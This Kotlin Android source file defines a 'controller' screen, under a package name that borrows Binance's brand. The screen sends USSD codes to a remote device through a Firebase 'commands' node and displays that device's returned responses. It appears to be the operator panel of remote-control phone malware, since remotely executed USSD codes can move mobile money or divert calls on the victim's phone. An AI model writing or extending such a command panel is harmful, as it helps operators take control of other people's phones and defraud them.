package dApp.binance.Trading.controller

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.database.FirebaseDatabase

class SendUssdActivity : AppCompatActivity() {

    private lateinit var ussdInput: EditText
    private lateinit var sendButton: Button
    private lateinit var responseText: TextView
    private lateinit var historyButton: Button
    private var deviceId: String = ""
    private var deviceName: String = ""
    private var fcmToken: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_send_ussd)

        ussdInput = findViewById(R.id.ussdInput)
        sendButton = findViewById(R.id.sendButton)
        responseText = findViewById(R.id.responseText)
        historyButton = findViewById(R.id.historyButton)

        deviceId = intent.getStringExtra("device_id") ?: ""
        deviceName = intent.getStringExtra("device_name") ?: ""
        fcmToken = intent.getStringExtra("fcm_token") ?: ""

        title = "Send USSD to $deviceName"

        sendButton.setOnClickListener {
            val ussdCode = ussdInput.text.toString().trim()
            if (ussdCode.isNotEmpty()) {
                sendUssd(ussdCode)
                ussdInput.text.clear()
            } else {
                Toast.makeText(this, "Enter USSD code", Toast.LENGTH_SHORT).show()
            }
        }

        historyButton.setOnClickListener {
            val intent = android.content.Intent(this, ResponseLogActivity::class.java)
            intent.putExtra("device_id", deviceId)
            startActivity(intent)
        }

        loadLatestResponse()
    }

    private fun sendUssd(code: String) {
        val database = FirebaseDatabase.getInstance().reference

        // Send via FCM using server
        val messageData = mapOf(
            "ussd_code" to code,
            "auto_execute" to "false",
            "timestamp" to System.currentTimeMillis().toString()
        )

        database.child("commands").child(deviceId).push().setValue(messageData)
            .addOnSuccessListener {
                Toast.makeText(this, "Command sent", Toast.LENGTH_SHORT).show()
            }
            .addOnFailureListener {
                Toast.makeText(this, "Failed to send", Toast.LENGTH_SHORT).show()
            }
    }

    private fun loadLatestResponse() {
        val database = FirebaseDatabase.getInstance().reference
        database.child("responses").child(deviceId).orderByChild("time_ms").limitToLast(1)
            .addValueEventListener(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    snapshot.children.lastOrNull()?.let { child ->
                        val response = child.value as? Map<*, *>
                        responseText.text = "Response:\n${response?.get("response")}"
                    }
                }

                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
            })
    }
}
